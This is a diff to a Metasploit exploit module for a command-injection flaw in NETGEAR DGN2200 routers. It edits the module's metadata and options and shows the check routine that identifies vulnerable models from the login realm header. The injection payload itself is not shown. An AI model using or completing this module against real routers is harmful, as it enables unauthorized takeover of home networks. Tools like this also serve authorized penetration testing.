@@ -16,16 +16,21 @@ class MetasploitModule < Msf::Exploit::Remote
     super(update_info(info,
       'Name'                 => "Netgear DGN2200 dnslookup.cgi Command Injection",
       'Description'          => %q{
-
+        This module exploits a command injection vulnerablity in NETGEAR
+        DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request
+        with valid login details.
       },
       'License'              => MSF_LICENSE,
       'Platform'             => 'unix',
-      'Author'               => ['thecarterb', 'SivertPL'],
+      'Author'               => [
+        'thecarterb',  # Metasploit Module
+        'SivertPL'     # Vuln discovery
+      ],
       'DefaultTarget'        => 0,
-      'Privileged'           => false,
+      'Privileged'           => true,
       'Arch'                 => [ARCH_CMD],
       'Targets'              => [
-        [ 'Automatic Target', { } ]
+        [ 'NETGEAR DDGN2200 Router', { } ]
       ],
       'References'           =>
         [
@@ -38,29 +43,28 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
-        OptString.new('PASSWORD', [true, 'Password to authenticate with', 'password']),
-        OptString.new('HOSTNAME', [true, '"Hostname" to look up (doesn\'t really do anything important)', 'www.google.com'])
+        OptString.new('USERNAME', [true, 'Username to authenticate with', '']),
+        OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])
       ], self.class)
+
+    register_advanced_options(
+    [
+      OptString.new('HOSTNAME', [true, '"Hostname" to look up (doesn\'t really do anything important)', 'www.google.com'])
+    ], self.class)
     end
 
-  def scrape(text, start_trig, end_trig)
-    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
-  end
-
-  # Requests the login page which discloses the hardware.
+  # Requests the login page which tells us the hardware version
   def check
     res = send_request_cgi({'uri'=>'/'})
     if res.nil?
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
-    
      # Checks for the `WWW-Authenticate` header in the response
     if res.headers["WWW-Authenticate"]
       data = res.to_s
       marker_one = "Basic realm=\"NETGEAR "
       marker_two = "\""
-      model = scrape(data, marker_one, marker_two)
+      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
       vprint_status("Router is a NETGEAR router (#{model})")
       if model == 'DGN2200v1' || model == 'DGN2200v2' || model == 'DGN2200v3' || model == 'DGN2200v4'
         print_good("Router may be vulnerable (NETGEAR #{model})")
